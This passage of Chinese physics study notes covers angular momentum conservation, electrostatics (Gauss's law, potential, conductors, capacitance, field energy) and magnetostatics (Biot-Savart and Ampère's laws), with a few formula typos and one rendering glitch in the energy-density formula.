质点的角动量定理是支配质点绕定点运动的动力学基本规律，实质上仍然是牛顿第二定律，与牛二相比只是用力矩替代了作用在质点上的力，用角动量代替了动量。</p>
<p>​ <strong>力矩是角动量发生变化的原因。</strong></p>
<h2 id="角动量守恒">角动量守恒</h2>
<p>​ 当作用在质点上的合力对固定点的力矩为零，即<strong>M</strong>=0</p>
<p>​ 那么由质点的角动量定理可得 <span class="math display">\[
\mathbf{L}=\mathbf{r}\times m\mathbf{v}=常矢量
\]</span> ​
如果作用在质点上的合力对某一规定点的力矩为零，则质点对该点的角动量保持不变</p>
<p>​ 该定理称为质点的角动量守恒定理</p>
<p>​ 由力矩的定义<span class="math inline">\(\mathbf{M}=\mathbf{r}\times
\mathbf{F}\)</span>可知，力矩为零有两种情况：</p>
<ol type="1">
<li>当<strong>F</strong>=0，质点不受外力作用时</li>
<li>虽然<span
class="math inline">\(\mathbf{F\neq0}\)</span>但力的作用线始终通过某一固定点，这样的力称为有心力，这一固定点被称为力心，力矩也为零</li>
</ol>
<h1 id="电学">电学</h1>
<h2 id="库仑定律">库仑定律</h2>
<p>​ 静止的点电荷，静电力正比于所带电荷量的乘积，反比于他们距离的平方
<span class="math display">\[
\mathbf{F}=k\frac{q_1q_2}{r^2}\mathbf{e_r}\\
\]</span></p>
<p><span class="math display">\[
k=\frac{1}{4\pi\varepsilon_0}\space (\varepsilon_0为真空介电常数)
\]</span></p>
<p><span class="math display">\[
\mathbf{F}=\frac{1}{4\pi\varepsilon_0}\frac{q_1q_2}{r^2}\mathbf{e_r}\\
\]</span></p>
<p>​ 静电力满足叠加原理，对元电荷产生的静电力积分得到整体的静电力</p>
<h2 id="静电场e">静电场(E)</h2>
<p>​ 激发电场</p>
<p>​ 变化电场产生变化磁场</p>
<p>​ 场具备能量和动量，是物质</p>
<p>​
描述电场性质的物理量：<strong>电场强度E</strong>,<strong>电势V</strong></p>
<h3 id="场强e">场强E</h3>
<p><span class="math display">\[
\mathbf{E}=\frac{\mathbf{F}}{q_0}
\]</span></p>
<p>​ 电场强度<strong>E</strong>是空间坐标的矢量函数 <span
class="math display">\[
\mathbf{E}=\mathbf{E(r)}或\mathbf{E}=\mathbf{E(x,y,z)}
\]</span> ​
静电场中，任一点只有一个电场强度与之对应，<strong>静电场具有单值性</strong>
<span class="math display">\[
\mathbf{E}=\frac{1}{4\pi \varepsilon_0}\frac{q}{r^2}\mathbf{e_r}
\]</span> ​ 叠加原理： <span class="math display">\[
\mathbf{E}=\sum_{i=1}^{n}{E_i}=\frac{1}{4\pi
\varepsilon_0}\sum^n_{i=1}\frac{q_i}{r_i^2}\mathbf{e_ri}
\]</span> ​ 连续分布电荷的电场强度： <span class="math display">\[
\mathbf{E}=\int d\mathbf{E}=\int \frac{1}{4\pi
\varepsilon_0}\frac{dq}{r^2}\mathbf{e_r}
\]</span> ​ 电荷密度： <span class="math display">\[
dq=\begin{cases}\rho dV\\\sigma dS \\ \lambda dl\end{cases}
\]</span></p>
<h2 id="电场强度计算公式">电场强度计算公式</h2>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230402133018740.png" /></p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230402133031125.png" /></p>
<p>​ 补偿法计算电场强度：将空处用负电荷填充</p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/%E6%97%A0%E6%A0%87%E9%A2%98%E7%9A%84%E7%AC%94%E8%AE%B0%E6%9C%AC-25.jpg" /></p>
<h2 id="电通量高斯定理">电通量&amp;高斯定理</h2>
<p>​
电场线密度：通过电场某点，垂直于场强<strong>E</strong>的单位面积上电场线条数等于该点电场强度<strong>E</strong>的大小
<span class="math display">\[
\mathbf{E}=\frac{d\Phi_e }{dS}
\]</span> ​ <span
class="math inline">\(\mathbf{\Phi_e}\)</span>称为穿过该面的<strong>电场强度通量</strong></p>
<p>​
规定：自闭合曲面<strong>向外</strong>的方向为各面积分<strong>法线的正方向</strong>。
<span class="math display">\[
\Phi_e=\oint_S \mathbf{E}\cdot dS
\]</span> ​ SI中，电场强度通量单位为:<span class="math inline">\(N\cdot
m^2 \cdot C^{-1}\)</span></p>
<p>​ 高斯定理： <span class="math display">\[
\Phi_e=\oint_S \mathbf{E}\cdot dS=\frac{\sum_iq_i}{\varepsilon_0}
\]</span> ​
在真空中的静电场中，通过任意封闭曲面的电场强度通量等于该封闭曲面所<strong>包围的</strong>电荷的代数和除以<span
class="math inline">\(\varepsilon_0\)</span>。</p>
<p>​
闭合曲面外的电荷对闭合曲面的电场强度通量<strong>无贡献</strong>。</p>
<p>​ 高斯定理中闭合积分曲面通常称为<strong>高斯面</strong></p>
<p>​ 意义：</p>
<ul>
<li>正电荷称为静电场的<strong>源头</strong>，负电荷称为静电场的尾闾，<strong>静电场是有源场</strong></li>
<li>高斯定理适用于静电场、运动电荷和迅速变化的电磁场</li>
<li>对称可以考虑使用高斯定理</li>
</ul>
<p>​ 高斯定理求电势：</p>
<ol type="1">
<li>进行对称性分析：球对称（均匀带电球面、球体、球壳）；轴对称性（直线、圆柱体、圆柱面）；面对称性</li>
<li>选取高斯面</li>
<li>计算</li>
</ol>
<h2 id="环路定理电势">环路定理&amp;电势</h2>
<p>​ 静电力是<strong>保守力</strong>，静电场是<strong>保守场</strong></p>
<p>​ 电场强度<strong>E</strong>沿任意路径的线积分为零，积分<span
class="math inline">\(\oint _L \mathbf{E}\cdot
d\mathbf{l}\)</span>称为<strong>E</strong>的环流 <span
class="math display">\[
\oint _L \mathbf{E}\cdot d\mathbf{l}=0
\]</span> ​
静电场的环路定理：在静电场中电场强度<strong>E</strong>的<strong>环流为零</strong></p>
<h3 id="电势电势能">电势/电势能</h3>
<p>​ 静电势能差等于电场力的功 <span class="math display">\[
W_{ab}=\int ^b _a q_0\mathbf{E}\cdot d\mathbf{l}
\]</span> ​ 电势定义为： <span class="math display">\[
V_a=\frac{W_a}{q_0}=\int ^\infty _a \mathbf{E}\cdot d\mathbf{l}
\]</span> ​ 结合后得到： <span class="math display">\[
A_{ab}=q_0\int_a ^b \mathbf{E}\cdot d\mathbf{l} =q_0(V_a-V_b)=W_a-W_b
\]</span></p>
<h3 id="电势的计算">电势的计算</h3>
<p><span class="math display">\[
v_a=\int \frac{dq}{4\pi \varepsilon_0 r}
\]</span></p>
<p>​ 若电荷分布延伸到无限远处，不能把势能零点选在无限远处</p>
<h2 id="常见带电体的电势">常见带电体的电势</h2>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230402133654596.png" /></p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230402133708532.png" /></p>
<h2 id="电场强度与电势的关系">电场强度与电势的关系</h2>
<p>​ 电场强度是电势的微分，电势是电场强度的积分</p>
<p>​ 积分关系： <span class="math display">\[
V_a-V_b=\int_a ^b \mathbf{E}\cdot d\mathbf{l}=\int _a ^b \mathbf{E}\cos
\theta dl
\]</span> ​ 微分关系： <span class="math display">\[
\mathbf{E_l}=-\frac{dV}{dl},\mathbf{E_l}=\mathbf{E}\cos \theta
\]</span> ​
电场强度在d<strong>l</strong>方向的分量等于电势沿该方向的<strong>变化率的负值</strong></p>
<p>​
如果d<strong>l</strong>沿着等势面的法线方向，写为d<strong>n</strong>，d<strong>n</strong>是两等势面间的最小位移，因此<span
class="math inline">\(\frac{dV}{dn}\)</span>为<span
class="math inline">\(\frac{dV}{dl}\)</span>的最大值 <span
class="math display">\[
\mathbf{E}=-\frac{dV}{dn}
\]</span> ​
电场强度大小等于<strong>过该点等势面的法线方向电势的变化率</strong>，方向与法线方向相反
<span class="math display">\[
\mathbf{E}=-(\frac{\partial V}{\partial x}\mathbf{i}+\frac{\partial
V}{\partial y}\mathbf{j}+\frac{\partial V}{\partial z}\mathbf{k})
\]</span></p>
<h2 id="保守力的一点小见解">保守力的一点小见解</h2>
<p>​
判定保守力的充要条件是场矢量的<strong>旋度</strong>为0，即为无旋场。</p>
<h3 id="旋度">旋度</h3>
<p>​
环量：给定一个三维空间中的向量场<strong>v</strong>，以及一个简单闭合有向（平面）曲线L，v沿着曲线的环量就是速度沿着路径的闭合曲线积分
<span class="math display">\[
Circ_v(L)=\oint_{L}v\cdot dr
\]</span> ​
线元dr方向是曲线的<strong>切线方向</strong>，其正方向规定为使得<strong>闭合曲线包围的面积在它的左侧。</strong></p>
<p>​
环量强度（环量的面密度）：向量场沿着L的<strong>环量与面元的比值</strong>在趋于0时候的极限值
<span class="math display">\[
lim_{\Delta S\to 0}\frac{1}{\Delta S}\oint_{L}v\cdot dr
\]</span> ​
如果要表现一点附近向量场的旋转程度，应表现其<strong>最大可能值</strong>及其所在面积的方向。</p>
<p>​
向量场的旋度是一个向量，它在一个方向上的投影的大小表示了在这个方向上的<strong>环量面密度的大小</strong>。</p>
<p>​ 记一点的旋度为<span class="math inline">\(rot \space
v\)</span>或<span class="math inline">\(curl\space v\)</span>满足：
<span class="math display">\[
\widehat{n}\cdot curl \space v=lim_{\Delta S\to 0}\frac{1}{\Delta
S}\oint_{L}v\cdot dr,\widehat{n}为\Delta S 所在平面的法向量
\]</span> ​ 如果用<strong>Nabla算子</strong>表示，向量场的旋度记作：
<span class="math display">\[
\nabla \times v
\]</span> ​
旋度是向量场的一种强度性质，对应的广延性质是向量场沿一个闭合曲线的环量。</p>
<h4 id="表示">表示</h4>
<p>​ 在三维直角坐标系<span
class="math inline">\(Oxyz\)</span>中，设向量场 <span
class="math display">\[
v=v_x\mathbf{i}+v_y\mathbf{j}+v_z\mathbf{k}
\]</span> ​ 场的分量<span
class="math inline">\(v_x,v_y,v_z\)</span>具有一阶连续偏导数，那么在各个坐标下的投影分别为：
<span class="math display">\[
\cases{(curl \space v)_x=\frac{\partial v_z}{\partial y}-\frac{\partial
v_y}{\partial z}  \\(curl \space v)_y=\frac{\partial v_x}{\partial z}
-\frac{\partial v_z}{\partial x} \\(curl\space v)_z=\frac{\partial
v_y}{\partial x}-\frac{\partial v_x}{\partial y}  }
\]</span> ​ 的向量叫做向量场<strong>v</strong>的旋度，也即是 <span
class="math display">\[
curl \space v=(\frac{\partial v_z}{\partial y}-\frac{\partial
v_y}{\partial z})i +(\frac{\partial v_x}{\partial z} -\frac{\partial
v_z}{\partial x})j+(\frac{\partial v_y}{\partial x}-\frac{\partial
v_x}{\partial y})k
\]</span> ​</p>
<p>​ 行列式记号为： <span class="math display">\[
\nabla \times \mathbf{v}=\begin{vmatrix}
\mathbf{i} &amp; \mathbf{j} &amp; \mathbf{k}\\
\frac{\partial }{\partial x} &amp; \frac{\partial }{\partial y} &amp;
\frac{\partial }{\partial z}\\
v_x &amp; v_y &amp;v_z
\end{vmatrix}
\]</span></p>
<h2 id="静电场的导体和电介质">静电场的导体和电介质</h2>
<h3 id="静电平衡">静电平衡</h3>
<p>​
静电平衡时，导体内和表面的自由电子不再运动，由此能推导出静电平衡条件</p>
<p>​ 导体达到静电平衡的条件：</p>
<ul>
<li>导体内部的每一点 的电场强度为0</li>
<li>导体表面处的电场强度必定处处垂直于导体表面</li>
</ul>
<p>​ 导体静电平衡时是一个等势体，导体的表面是一个等势面</p>
<h4 id="电荷分布">电荷分布</h4>
<p>​
导体内部处处没有净电荷存在，电荷只分布在导体的外表面上；若导体内部有空腔，而且空腔内部没有其他带电体，空腔表面上也不存在净电荷。</p>
<p>​
处于静电平衡的导体，表面上一点的电场强度和该点处导体表面电荷的面密度成正比，即
<span class="math display">\[
\mathbf{E}=\frac{\sigma}{\varepsilon_0}
\]</span> ​
处于静电平衡的孤立导体，其表面上电荷面密度的大小与表面的曲率有关</p>
<h3 id="静电感应和静电屏蔽">静电感应和静电屏蔽</h3>
<p>​
静电感应：导体在<strong>外电场的作用</strong>下导体出现电荷重新分布的现象</p>
<p>​ 静电屏蔽：空腔导体内的物体不受外界电场影响</p>
<p>​
如果导体空腔内部有电荷，由于静电感应，导体的内外表面也会产生等量异号的感应电荷，若此时接地，外表面电荷将全部导入地下，接地的导体外壳把内部电场对外界的影响隔绝了，这也是一种屏蔽现象。</p>
<h2 id="电容">电容</h2>
<p>​ 平行板电容器： <span class="math display">\[
C=\frac{\varepsilon_0 \varepsilon_r S}{d}
\]</span> ​ 球形电容器： <span class="math display">\[
C=\frac{4\pi \varepsilon_0 \varepsilon_rR_1R_2}{R_2-R_1}
\]</span> ​
若R<sub>1</sub>和R<sub>2</sub>都很大，且两球壳的间距d=R<sub>2</sub>-R<sub>1</sub>很小，于是近似地有<span
class="math inline">\(R_1R_2=R_1^2\)</span>。得： <span
class="math display">\[
C=\frac{\varepsilon_0 \varepsilon_r S}{d}
\]</span> ​ 若<span class="math inline">\(R_2 \gg R_1 ,则R_2-R_1\approx
R_2\)</span>： <span class="math display">\[
C=\frac{4\pi \varepsilon_0 \varepsilon_rR_1R_2}{R_2}=4\pi
\varepsilon_0\varepsilon_r R_1
\]</span> ​</p>
<h2 id="电场能量">电场能量</h2>
<p>​ 对于平行板电容器： <span class="math display">\[
U=Ed,C=\frac{\varepsilon S}{d}
\]</span></p>
<p><span class="math display">\[
W_e=\frac{1}{2}CU^2=\frac{1}{2}\frac{\varepsilon
S}{d}(Ed)^2=\frac{1}{2}\varepsilon E^2 \cdot Sd=\frac{1}{2}\varepsilon
E^2\cdot V
\]</span></p>
<p>​ 式中V为电容器中电场遍及的空间体积</p>
<p>​ 引入电场能量的体密度，即单位体积电场内所具有的电场能量，用符号$_e
<span class="math inline">\(表示：\)</span>$ _e==E^2 $$ ​
可以看出，只要空间任一处存在电场，电场强度为<strong>E</strong>，该处单位体积就存储着能量<span
class="math inline">\(\frac{1}{2}\varepsilon E^2\)</span></p>
<p>​ 在不均匀电场， <span class="math display">\[
dW_e=\omega _edV
\]</span> ​ 整个电场存储的静电能为： <span class="math display">\[
W_e=\int _V d W_e=\int _V \frac{1}{2}\varepsilon E^2 dV
\]</span> ​ 式中的积分遍及整个电场分布的空间。</p>
<h1 id="磁学">磁学</h1>
<p>​ <img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230512232511997.png" /></p>
<p>运动电荷、载流导线、磁体能产生磁场.</p>
<p>磁场对运动电荷、载流导线、磁体均有作用力.</p>
<h2 id="稳恒电流的磁场">稳恒电流的磁场</h2>
<p>​ 电流元：在导线上任取以有向线元<span
class="math inline">\(d\mathbf{l}\)</span>，其方向<strong>沿电流方向</strong>.电流强度<span
class="math inline">\(I\)</span>与<span class="math inline">\(d\mathbf
l\)</span>的乘积，即<span class="math inline">\(\mathbf Id\mathbf
l\)</span>称为电流元矢量，简称<strong>电流元</strong>，其大小等于电流强度<span
class="math inline">\(\mathbf I\)</span>与线元长度<span
class="math inline">\(d\mathbf
l\)</span>的乘积，方向<strong>沿电流方向</strong>.</p>
<p>​ 磁感应强度大小（比值定义）： <span class="math display">\[
B=\frac{d \mathbf F}{\mathbf I dl\sin \theta}
\]</span> ​ 电流元受到磁场作用力<span class="math inline">\(d\mathbf
F\)</span>的大小为 <span class="math display">\[
d \mathbf F=BIdl\sin \theta
\]</span> ​ 方向由右手螺旋定则确定.</p>
<p>​ 矢量式： <span class="math display">\[
d\mathbf F=Id\mathbf l \times \mathbf B
\]</span> ​ 通常，<span class="math inline">\(d\mathbf
F\)</span>被称为安培力，上式被称为安培力公式. ​ 当<span
class="math inline">\(\theta
=\frac{\pi}{2}\)</span>时，电流元受到磁场的作用力最大，有 <span
class="math display">\[
B=\frac{dF_{max}}{Idl}
\]</span> ​ 磁感应强度B的大小等于单位电流元受到的最大磁场力. ​
综上，<strong>磁感应强度B的定义</strong>为：</p>
<p>​
磁场中某点的磁感应强度B是一个<strong>矢量</strong>，其方向沿该点处静止小磁针的N极指向，其大小等于单位电流元在该点处受到的最大磁场力.</p>
<p>​ SI中，磁感应强度B的单位为<strong>特斯拉(T)</strong>,简称特。</p>
<p>​ 非SI单位——高斯(Gs)，它与T的换算关系是 <span class="math display">\[
1T=10^4Gs
\]</span> ​ 载流闭合线圈在匀强磁场中受到的安培力矢量和恒为零。</p>
<h2 id="毕奥-萨伐尔定律定律">毕奥-萨伐尔定律定律</h2>
<p>​ 在导线上任取一电流元<span class="math inline">\(\mathbf Id\mathbf
l\)</span>,P为空间中任意一点，由<span class="math inline">\(\mathbf
Id\mathbf l\)</span>到P点的位矢为<span class="math inline">\(\mathbf
r\)</span>，<span class="math inline">\(\mathbf Id\mathbf
l\)</span>和<span class="math inline">\(\mathbf
r\)</span>之间的夹角为<span class="math inline">\(\theta\)</span>.</p>
<p>​ <strong>毕-萨定律</strong>的数学表达式为： <span
class="math display">\[
dB=\frac{\mu_0}{4\pi}\frac{\mathbf I dl\sin \theta}{r^2}
\]</span> ​ 式中<span class="math inline">\(\mu_0=4\pi \times 10^{-7}N
\cdot A ^{-2}\)</span>，称为<strong>真空磁导率</strong>. ​
方向由右手螺旋定则确定.</p>
<p>​ 矢量式： <span class="math display">\[
d\mathbf B=\frac{\mu_0}{4\pi}\frac{\mathbf I d\mathbf l \times \mathbf
r}{r^3}=\frac{\mu_0}{4\pi}\frac{\mathbf I d\mathbf l \mathbf e_r}{r^2}
\]</span> ​ 式中<span class="math inline">\(\mathbf e_r\)</span>是<span
class="math inline">\(\mathbf
r\)</span>方向的<strong>单位矢量</strong>.</p>
<p>​ 遵从<strong>矢量叠加定律</strong>，则有 <span
class="math display">\[
\mathbf \int d \mathbf B=\int \frac{\mu _0}{4\pi}\frac{\mathbf I
d\mathbf l\times \mathbf e_r}{r^2}
\]</span> ​ 积分遍及整个载流导体或导体回路. ​ 常选取适当坐标系将<span
class="math inline">\(d\mathbf B\)</span>进行分解，例如在直角坐标系
<span class="math display">\[
d \mathbf B=d B_x \mathbf i+d B_y \mathbf j+d B_z \mathbf k
\]</span> ​ 然后分别对<span class="math inline">\(d\mathbf
B\)</span>的三个直角分量进行积分，得: <span class="math display">\[
B_x=\int dB_x ,\space B_y=\int dB_y,\space B_z=\int dB_z
\]</span> ​ 而总磁感应强度为： <span class="math display">\[
\mathbf B=B_x \mathbf i+ B_y \mathbf j+ B_z \mathbf k
\]</span> ​ 一般情况下<span class="math inline">\(B\neq \int
dB\)</span>，除非所以的<span class="math inline">\(d\mathbf
B\)</span>的方向都相同，才能直接对<span class="math inline">\(d\mathbf
B\)</span>的大小进行积分得到总磁感应强度B的大小.</p>
<h3 id="载流直导线">载流直导线</h3>
<p>​ <img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230513181937321.png" /></p>
<p>​ 若载流直导线两端延伸到无限远，成为无限长载流直导线，则： <span
class="math display">\[
B=\frac{\mu _0 I}{2\pi a}
\]</span> ​ 上述是一个<strong>常用公式</strong>.(非常重要)</p>
<h3 id="载流圆线圈轴线">载流圆线圈轴线</h3>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230513195221018.png" /></p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230513195305671.png" /></p>
<h3 id="磁偶极子">磁偶极子</h3>
<p>​ 由右手螺旋定则可以将载流线圈看作“磁偶极子”</p>
<p>​ 载流线圈的磁矩定义为： <span class="math display">\[
\mathbf m=\mathbf I S\mathbf e_n
\]</span> ​ 式中的<span class="math inline">\(\mathbf
e_n\)</span>是载流线圈平面正法线方向的单位矢量，其方向与线圈中电流的绕行方向满足右手螺旋定则.
​
磁矩是一个矢量，其大小等于IS，此举的方向沿载流线圈的<strong>正法线方向</strong>.
​磁矩的定义对于电流为I的任意形状的平面载流线圈都适用.</p>
<p>​ 若线圈是由紧靠在一起、载流为<span
class="math inline">\(I\)</span>的N匝相同线圈组成的，其磁矩可写作：
<span class="math display">\[
\mathbf m=NIS\mathbf e_n
\]</span> ​ 利用磁矩的概念，载流圆线圈轴线上的磁感应强度<span
class="math inline">\(\mathbf B\)</span>可写作： <span
class="math display">\[
\mathbf B=\frac{\mu _0}{2\pi}\frac{\mathbf m}{(x^2+R^2)^{\frac{3}{2}}}
\]</span> ​
两根载有反方向电流的导线在两线外侧单独产生的磁场部分抵消，使得总磁感应强度以更快的速度衰减，即与距离的二次方成反比.</p>
<h3 id="带电均匀圆盘">带电均匀圆盘</h3>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230513211138573.png" /></p>
<h3
id="计算方法常用的磁感应强度公式">计算方法&amp;常用的磁感应强度公式</h3>
<ol type="1">
<li>将电流分割为无限多个<strong>电流元</strong></li>
<li>任取一个电流元，根据毕-萨定律写出该电流元在P点产生的磁感应强度<span
class="math inline">\(d\mathbf B\)</span>的大小并判断方向</li>
<li>如果所有电流元在P点产生的磁感应强度<span
class="math inline">\(d\mathbf
B\)</span>的方向都相同，则直接积分得到</li>
<li>如果不同，则需要将<span class="math inline">\(d\mathbf
B\)</span>分解，然后对各分量进行积分，积分应遍及整个电流分布</li>
</ol>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230513214655544.png" /></p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230513214710686.png" /></p>
<h3 id="运动电荷的磁场">运动电荷的磁场</h3>
<p>​ 在载流导体上任取一个电流元<span class="math inline">\(\mathbf I
d\mathbf l\)</span>,P点为空间中任意一点，由电流元到P点的位矢<span
class="math inline">\(\mathbf
r\)</span>，根据毕--萨定律，该电流元在P点产生的磁感应强度为： <span
class="math display">\[
d\mathbf B=\frac{\mu _0 }{4\pi}\frac{Id\mathbf l}{r^3}
\]</span> ​ 设导体的横截面积为<span
class="math inline">\(S\)</span>，单位体积内载流子数目为<span
class="math inline">\(n\)</span>，每个载流子所带电荷为<span
class="math inline">\(q\)</span>，并以平均速度<span
class="math inline">\(v\)</span>定向运动，根据电流定义<span
class="math inline">\(I=nqvS\)</span>，因此电流元的大小可表示为： <span
class="math display">\[
Idl=nqvSdl=qvdN
\]</span> ​ 其中，<span
class="math inline">\(dN=nSdl\)</span>是所考察的<strong>电流元中包含的载流子数.</strong></p>
<p>​ 因此，电流元矢量可写为 <span class="math display">\[
Id\mathbf l=q\mathbf vdN
\]</span> ​ 将这一结果代入毕萨定律得： <span class="math display">\[
d\mathbf B=\frac{\mu _0 }{4\pi}\frac{q\mathbf v\times \mathbf r}{r^3}dN
\]</span> ​
上式说明，电流元产生的磁场正是由电流元中dN个运动着的电荷所产生的.由此，得到带电为q、运动速度为<span
class="math inline">\(\mathbf
v\)</span>的一个带电粒子在P点产生的磁感应强度<span
class="math inline">\(\mathbf B\)</span>为 <span class="math display">\[
\mathbf B=\frac{d\mathbf B}{dN}=\frac{\mu _0 }{4\pi}\frac{q\mathbf
v\times \mathbf r}{r^3}
\]</span> ​ 其中<span class="math inline">\(\mathbf
r\)</span>是由运动电荷到P点的<strong>位矢</strong>.</p>
<p>​ 运动电荷在P点产生的磁感应强度<span class="math inline">\(\mathbf
B\)</span>的大小为： <span class="math display">\[
\mathbf B=\frac{\mu _0 }{4\pi}\frac{|q| v \sin \theta }{r^2}
\]</span> ​ 其中<span
class="math inline">\(\theta\)</span>是电荷定向运动速度<span
class="math inline">\(\mathbf v\)</span>与位矢<span
class="math inline">\(\mathbf
r\)</span>之间的<strong>夹角</strong>.<span
class="math inline">\(\mathbf B\)</span>的大小垂直与速度<span
class="math inline">\(\mathbf v\)</span>和位矢<span
class="math inline">\(\mathbf
r\)</span>所决定的平面，由右手螺旋法则确定.</p>
<p>​ 该式只适应于<strong>电荷的运动速度远小于光速的情况.</strong></p>
<p>​
运动电荷除了产生磁场外，还在其周围空间产生电场，在电荷运动速度远小于光速的情况下，运动电荷在P点产生的电场强度为
<span class="math display">\[
\mathbf E=\frac{q}{4\pi \varepsilon_0 r^3}\mathbf r
\]</span> ​ 运动电荷的电场和磁场之间有如下关系： <span
class="math display">\[
\mathbf B=\mu _0 \varepsilon_0 \mathbf v\times \mathbf E
\]</span> ​ 上式表明，运动电荷产生的电场和磁场是紧密联系的.</p>
<h2 id="磁通量高斯定理">磁通量&amp;高斯定理</h2>
<h3 id="磁通量">磁通量</h3>
<p>​ 磁场线的每一点的切线方向代表<span class="math inline">\(\mathbf
B\)</span>的方向，磁场的强弱由磁场线的疏密来表示. ​
在磁场中某点处取一个和该点处磁感应强度<span
class="math inline">\(\mathbf B\)</span>相垂直的面积元，其面积为<span
class="math inline">\(dS_\bot\)</span>，让穿过这一面积元的磁场线条数<span
class="math inline">\(d\Phi_m\)</span>和面元面积<span
class="math inline">\(dS_\bot\)</span>的比值等于该点处磁感应强度<span
class="math inline">\(\mathbf B\)</span>的大小 <span
class="math display">\[
B=\frac{d\Phi_m}{dS_\bot}
\]</span> ​ 也就是说，磁场中某点处的磁感应强度<span
class="math inline">\(\mathbf
B\)</span>的大小等于通过和该点处磁感应强度<span
class="math inline">\(\mathbf
B\)</span>相垂直的单位面积的磁场线条数(<strong>磁场线密度</strong>)</p>
<p>​ 将一曲面分割为无限多个面积元.任取一个面积元<span
class="math inline">\(dS\)</span>，根据磁场线的定义，穿过该面积元的磁通量，即磁场线条数为
<span class="math display">\[
d\Phi_m=BdS_\bot=B\cos \theta dS=\mathbf B \cdot d \mathbf S
\]</span> ​ 式中<span class="math inline">\(\theta\)</span>是面积元<span
class="math inline">\(dS\)</span>的法向单位矢量<span
class="math inline">\(\mathbf e_r\)</span>与磁感应强度<span
class="math inline">\(\mathbf B\)</span>之间的夹角，<span
class="math inline">\(d\mathbf S=dS\mathbf e_r\)</span>是面积元矢量. ​
磁通量是标量，穿过整个曲面S的磁通量等于穿过每一个面积元磁通量的代数和，因此，对上式积分，可得到穿过整个曲面S的磁通量
<span class="math display">\[
\Phi_m=\int_S \mathbf B\cdot d\mathbf S=\int _S B\cos \theta dS
\]</span> ​ 积分遍及整个曲面S. ​
对于闭合曲面，磁场线穿出时相应的磁通量为正，穿入时相应的磁通量为负.</p>
<p>​ 在SI中，磁通量的单位时韦伯(Wb),<span
class="math inline">\(1Wb=1T\cdot m^2=1N\cdot m \cdot
A^{-1}\)</span></p>
<h3 id="磁场高斯定理">磁场高斯定理</h3>
<p>​
由于磁场线都是无头无尾的闭合曲线，显然，从一个闭合曲面S某处穿入的磁场线将要从该闭合曲面的另一处穿出.</p>
<p>​
所以，在任意磁场，<strong>通过任意闭合曲面S的磁通量必定为零</strong>，即
<span class="math display">\[
\oint _S\mathbf B\cdot d\mathbf S=\oint _S B\cos \theta dS=0
\]</span> ​ 上述结论即为磁场的高斯定理. ​ 与静电场的高斯定理进行对比 <span
class="math display">\[
\oint _S \mathbf E\cdot d \mathbf S=\frac{1}{\varepsilon_0}\sum_S q_i
\]</span> ​
静电场的高斯定理表明：静电场时由静电荷产生的，是有源场，电场线不闭合，起于正电荷，终止于负电荷;</p>
<p>​
磁场的高斯定理表明：磁场是既无起点也无终点的闭合曲线，没有源头和尾闾，是无源场.</p>
<h2 id="安培环路定理">安培环路定理</h2>
<p>​ 静电场的环路定理表明，静电场强<span class="math inline">\(\mathbf
E\)</span>沿任意闭合路径L的环流<strong>恒等于零</strong>，即 <span
class="math display">\[
\oint _L\mathbf E\cdot d\mathbf l\equiv 0
\]</span> ​ 它反映了<strong>静电场是保守场</strong>这一特点.</p>
<p><strong>安培环路定理</strong>：</p>
<p>​ 真空中，稳恒磁场的磁感应强度<span
class="math inline">\(\mathbf  B\)</span>沿任意闭合路径L的线积分等于真空磁导率<span
class="math inline">\(\mu_0\)</span>乘以穿过该闭合路径的<strong>所有电流的代数和</strong>，其数学表达式为
<span class="math display">\[
\oint _L \mathbf B \cdot d\mathbf l=\mu_0 \sum_L  I_i
\]</span> ​ <span class="math inline">\(\mathbf
B\)</span>的环流与积分路径外的电流及其分布<strong>无关</strong>.</p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230513232514698.png" /></p>
<p>​ 如上图，<span class="math inline">\(\mathbf
B\)</span>的环流仅于<span
class="math inline">\(I_1、I_2\)</span>有关.</p>
<p>​
在安培环路定理中，电流是<strong>代数量</strong>，其正、负由右手螺旋定则确定.</p>
<p>​ 可从</p>
<ul>
<li>闭合路径包围电流</li>
</ul>
<p>​ <img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230514000546144.png" /></p>
<ul>
<li>闭合路径不包围电流</li>
<li>闭合回路内外均有多个直线电流</li>
</ul>
<p>​ 磁感应强度<span class="math inline">\(\mathbf
B\)</span>是由所有的稳恒电流及其分布决定的，但是，<span
class="math inline">\(\mathbf
B\)</span>的环流仅与穿过闭合路径的电流代数和有关.</p>
<p>​
在矢量分析中，把矢量环流等于零的场称为无旋场，反之称为有旋场.静电场是无旋场，磁场是有旋场.</p>
<p>​
磁场的高斯定理对变化的磁场也适用，但是这里给出的安培环路定理对变化的磁场不成立，需要进一步的推广.</p>
<h3
id="无限长均匀载流空心圆柱导体的磁场">无限长均匀载流空心圆柱导体的磁场</h3>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230513233449993.png" /></p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230513233541540.png" /></p>
<p>​ 均匀空心长圆柱导体产生的磁感应强度<span
class="math inline">\(\mathbf B\)</span>的大小与到轴线距离<span
class="math inline">\(r\)</span>的关系曲线</p>
<p><img data-src="https://sa1geblogimage-1316665129.cos.ap-beijing.myqcloud.com/img/image-20230513233643735.png" /></p>
<h3 id="无限长载流密绕螺线管">无限长载流密绕螺线管</h3>
